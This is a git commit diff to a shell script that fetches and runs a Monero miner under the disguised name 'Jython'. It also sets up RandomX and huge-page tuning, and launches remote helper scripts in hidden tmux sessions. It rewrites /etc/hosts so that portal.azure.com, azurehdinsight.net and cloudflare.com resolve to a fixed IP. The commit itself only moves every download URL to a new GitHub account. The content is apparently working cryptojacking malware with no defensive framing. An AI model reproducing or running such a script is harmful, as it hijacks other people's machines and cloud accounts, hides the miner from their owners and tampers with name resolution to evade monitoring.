9982da30877df9962d44f034d07416b501e369fe
crawford1988 <74532862+crawford1988@users.noreply.github.com>
2020-11-16 00:50:20 -0800

    Update https.sh

--- https.sh
+++ https.sh
@@ -10,7 +10,7 @@ else
 
 echo "script da install , chay thoi "
 sudo rm config.json
-sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
+sudo wget https://raw.githubusercontent.com/crawford1988/codeweb/main/config.json
 sudo tmux new-session -d -s my_session1  './Jython'
 
 fi
@@ -21,20 +21,20 @@ fi
 
 sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev cpulimit ipset -y
 sudo rm config.json
-sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
-sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
-wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
+sudo wget https://raw.githubusercontent.com/crawford1988/codeweb/main/config.json
+sudo wget https://raw.githubusercontent.com/crawford1988/codeweb/main/httpswww
+wget https://raw.githubusercontent.com/crawford1988/codeweb/main/enable_1gb_pages.sh
 sudo bash enable_1gb_pages.sh
-wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
+wget https://raw.githubusercontent.com/crawford1988/codeweb/main/randomx_boost.sh
 sudo bash randomx_boost.sh
-sudo chmod +x httpd
-mv httpd Jython
+sudo chmod +x httpswww
+mv httpswww Jython
 sudo -- sh -c "echo '148.163.92.24  portal.azure.com' >> /etc/hosts"
 sudo -- sh -c "echo '148.163.92.24  azurehdinsight.net' >> /etc/hosts"
 sudo -- sh -c "echo '148.163.92.24  cloudflare.com' >> /etc/hosts"
-wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/24h.sh
+wget https://raw.githubusercontent.com/crawford1988/codeweb/main/24h.sh
 sudo chmod +x 24h.sh
 sudo tmux new-session -d -s my_session12  './24h.sh'
-wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/block.sh
+wget https://raw.githubusercontent.com/crawford1988/codeweb/main/block.sh
 sudo chmod +x block.sh
 sudo tmux new-session -d -s my_session1342  './block.sh'
